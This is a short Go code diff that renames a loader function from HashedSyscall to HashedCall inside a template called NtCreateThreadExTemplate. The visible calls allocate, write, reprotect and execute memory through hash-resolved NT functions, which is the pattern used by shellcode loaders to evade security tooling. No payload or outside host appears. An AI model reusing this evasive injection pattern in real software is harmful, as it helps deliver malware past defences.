@@ -81,7 +81,7 @@ func (t NtCreateThreadExTemplate) Process() string {
 		log.Fatal(err)
 	}
 
-    rvalue := loader.HashedSyscall(
+    rvalue := loader.HashedCall(
 		NtAllocateVirtualMemory,
 		uintptr(0xffffffffffffffff),
 		uintptr(unsafe.Pointer(&addr)),
@@ -101,7 +101,7 @@ func (t NtCreateThreadExTemplate) Process() string {
 		log.Fatal(err)
 	}
 
-    rvalue = loader.HashedSyscall(
+    rvalue = loader.HashedCall(
         NtWriteVirtualMemory,
 		uintptr(0xffffffffffffffff),
 		addr,
@@ -121,7 +121,7 @@ func (t NtCreateThreadExTemplate) Process() string {
 		log.Fatal(err)
 	}
 
-    rvalue = loader.HashedSyscall(
+    rvalue = loader.HashedCall(
         NtProtectVirtualMemory,
 		uintptr(0xffffffffffffffff),
 		uintptr(unsafe.Pointer(&addr)),
@@ -142,7 +142,7 @@ func (t NtCreateThreadExTemplate) Process() string {
 		log.Fatal(err)
 	}
 
-    rvalue =  loader.HashedSyscall(
+    rvalue =  loader.HashedCall(
         NtCreateThreadEx,
 		uintptr(unsafe.Pointer(&hhosthread)),
 		0x1FFFFF,
